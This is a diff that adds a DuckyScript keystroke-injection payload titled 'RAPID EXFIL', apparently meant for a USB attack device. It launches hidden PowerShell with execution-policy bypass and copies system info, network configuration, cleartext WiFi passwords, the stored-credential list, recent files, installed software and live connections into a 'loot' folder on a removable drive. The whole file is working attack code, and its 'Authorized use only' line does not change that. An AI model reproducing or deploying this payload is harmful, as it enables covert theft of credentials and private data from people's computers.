@@ -1,0 +1,14 @@
+REM ============================================================================
+REM  RAPID EXFIL — 15-Second Full System Grab
+REM  ============================================================================
+REM  Fastest possible data extraction. Grabs WiFi passwords, system info,
+REM  browser data, and recent files in under 15 seconds.
+REM  
+REM  FLLC | Authorized use only.
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoP -Exec Bypass -C "$d=(Get-WmiObject Win32_LogicalDisk -F 'DriveType=2'|%{$_.DeviceID}|Select -First 1);if(!$d){$d=$env:TEMP};$o=\"$d\loot_$(hostname)\";md $o -F|Out-Null;systeminfo|Out-File $o\sys.txt;ipconfig /all|Out-File $o\net.txt;netsh wlan show profiles|%{if($_-match'Profile\s*:\s*(.+)'){$n=$Matches[1].Trim();$r=netsh wlan show profile $n key=clear;$k=($r|sls 'Key Content'|%{($_-split':')[1].Trim()});\"$n : $k\"}}|Out-File $o\wifi.txt;Get-Process|Out-File $o\procs.txt;Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent\*.lnk -ea 0|Sort LastWriteTime -Desc|Select -First 30|%{$_.Name}|Out-File $o\recent.txt;Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*|?{$_.DisplayName}|Select DisplayName,DisplayVersion|ft -a|Out-String|Out-File $o\software.txt;cmdkey /list|Out-File $o\creds.txt;Get-NetTCPConnection -State Established|Select RemoteAddress,RemotePort,OwningProcess|ft -a|Out-String|Out-File $o\conns.txt"
+ENTER
